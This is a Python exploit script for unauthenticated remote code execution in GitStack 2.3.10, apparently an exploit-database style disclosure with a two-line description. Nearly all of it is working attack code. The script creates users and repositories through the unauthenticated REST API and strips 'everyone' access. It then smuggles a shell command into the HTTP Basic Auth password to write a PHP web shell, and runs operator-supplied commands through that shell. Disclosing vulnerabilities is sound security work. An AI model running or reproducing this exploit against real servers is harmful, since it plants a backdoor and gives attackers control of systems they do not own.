# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
# Date: 18.01.2018
# Software Link: https://gitstack.com/
# Exploit Author: Kacper Szurek
# Contact: https://twitter.com/KacperSzurek
# Website: https://security.szurek.pl/
# Category: remote
#   
#1. Description
#  
#$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.
#
#https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html
# 
#2. Proof of Concept

import requests
import os
import sys
import argparse

def options() -> dict:

    '''
    Function to define arguments.
    Parameters
    ----------
    None
    Returns
    -------
    arg:dict Dict of arguments
    '''

    option = argparse.ArgumentParser()
    option.add_argument('-ip', '--ip', dest='ip', help='ip of target')
    option.add_argument('-c', '--command', dest='command', help="command to send to gitserver")

    arg = vars(option.parse_args())
    
    return arg

def main() -> None:
    
    args = options()
    ip = args['ip']
    command = args['command']
    
    repository = 'rce'
    username = 'rce'
    password = 'rce'
    csrf_token = 'token'
    
    user_list = []
    
    print("[+] Get user list")
    try:
        r = requests.get(f"http://{ip}/rest/user/")
        user_list = r.json()
        user_list.remove('everyone')
    except:
        pass
    
    if len(user_list) > 0:
        username = user_list[0]
        print(f"[+] Found user {username}")
    else:
        r = requests.post(f"http://{ip}/rest/user/", data={'username' : username, 'password' : password})
        print("[+] Create user")
        
        if not "User created" in r.text and not "User already exist" in r.text:
            print("[-] Cannot create user")
            os._exit(0)
    
    r = requests.get(f"http://{ip}/rest/settings/general/webinterface/")
    if "true" in r.text:
        print("[+] Web repository already enabled")
    else:
        print("[+] Enable web repository")
        r = requests.put(f"http://{ip}/rest/settings/general/webinterface/", data='{"enabled" : "true"}')
        if not "Web interface successfully enabled" in r.text:
            print("[-] Cannot enable web interface")
            os._exit(0)
    
    print("[+] Get repositories list")
    r = requests.get(f"http://{ip}/rest/repository/")
    repository_list = r.json()
    
    if len(repository_list) > 0:
        repository = repository_list[0]['name']
        print(f"[+] Found repository {repository}")
    else:
        print("[+] Create repository")
    
        r = requests.post(f"http://{ip}/rest/repository/", cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
        if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
            print("[-] Cannot create repository")
            os._exit(0)
    
    print("[+] Add user to repository")
    r = requests.post(f"http://{ip}/rest/repository/{repository}/user/{username}/")
    
    if not "added to" in r.text and not "has already" in r.text:
        print("[-] Cannot add user to repository")
        os._exit(0) 
    
    print("[+] Disable access for anyone")
    r = requests.delete(f"http://{ip}/rest/repository/{repository}/user/everyone/")
    
    if not "everyone removed from rce" in r.text and not "not in list" in r.text:
        print("[-] Cannot remove access for anyone")
        os._exit(0) 
    
    print("[+] Create backdoor in PHP")
    r = requests.get(f'http://{ip}/web/index.php?p={repository}.git&a=summary', auth=requests.auth.HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit.php'))
    print(r.text.encode(sys.stdout.encoding, errors='replace').decode("utf-8"))
    
    print("[+] Execute command")
    r = requests.post(f"http://{ip}/web/exploit.php", data={'a' : command})
    print(r.text.encode(sys.stdout.encoding, errors='replace').decode("utf-8"))

if __name__ == '__main__':
    main()